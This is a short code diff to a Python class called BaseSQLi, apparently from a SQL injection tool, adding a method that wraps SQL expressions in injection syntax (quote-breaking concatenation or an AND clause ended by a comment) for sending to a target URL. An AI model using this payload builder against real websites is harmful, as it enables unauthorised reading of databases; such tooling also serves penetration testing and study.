@@ -1,4 +1,5 @@
 import requests
+from .dbConfig import DB_CONFIG
 
 class BaseSQLi:
     def __init__(self, url, targetTable, db_type="oracle", inject_point=None, extra_cookies=None):
@@ -21,6 +22,14 @@ class BaseSQLi:
             return self._send_methods[location](payload)
         else:
             raise ValueError(f"Unsupported injection location: {location}")
+
+    def build_payload(self, sql_expression):
+        config = DB_CONFIG[self.db_type]
+        concat = config["concat"]
+        if concat in ("||", "+"):
+            return f"'{concat}({sql_expression}){concat}'"
+        else:
+            return f"' AND ({sql_expression}){config['comment']}"
 
     def extract(self, column):
         raise NotImplementedError("Subclasses should implement this method.")
